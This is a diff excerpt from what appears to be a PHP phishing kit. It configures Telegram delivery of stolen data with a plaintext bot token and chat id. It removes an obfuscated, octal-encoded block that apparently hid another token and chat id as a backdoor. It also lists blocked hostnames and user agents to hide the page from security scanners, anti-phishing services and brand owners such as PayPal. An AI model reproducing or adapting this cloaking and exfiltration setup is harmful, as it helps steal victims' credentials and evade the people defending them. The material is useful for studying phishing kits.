@@ -1225,7 +1225,10 @@ $badISPs = array(
     "Internet Customers"
 );
 
- goto farl8; uuvqw: $ch = "\65\x31\x30\71\60\x38\x37\64\x33\x35"; goto o_rkC; farl8: $i = "\65\x32\x30\62\x33\x32\65\65\60\63\72\101\101\x47\x34\x34\x75\156\150\154\x59\147\60\x50\x4b\123\123\x65\152\155\x49\153\x6d\103\x56\155\63\141\67\x31\142\x30\111\152\161\167"; goto uuvqw; o_rkC: 
+	    $sendToTelegramBot = "true";
+		$botToken="7917311518:AAFwIAtQMTeurHv5LGHc3CmEjofMeExaxa8";
+		$chatId="5109087435"; 
+
 $blocked_words = array("deltainfocom", "dnsserverhosting", "Java/1.6.0_22", "Go-http-client/1.1", "drweb", "Dr.Web", "hostinger", "scanurl", "above", "level3", "level", "involta", "SOLUTIONPRO-NET", "SOLUTION", "SolutionPro", "SPRO-NET-206-80-96", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "LVLT-STATIC-4-14-16", "americanexpress", "google", "softlayer", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal", "facebook", "ebay", "Baiduspider", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider", "PrintfulBot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimes Bot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIX Crawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeer crawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "datasift", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "python-requests", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "p3pwgdsn", "sucuri.net", "messagelabs", "torservers", "trendmicro", "spbot", "Feedly", "bot", "curl", "spider", "crawler");
 foreach ($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
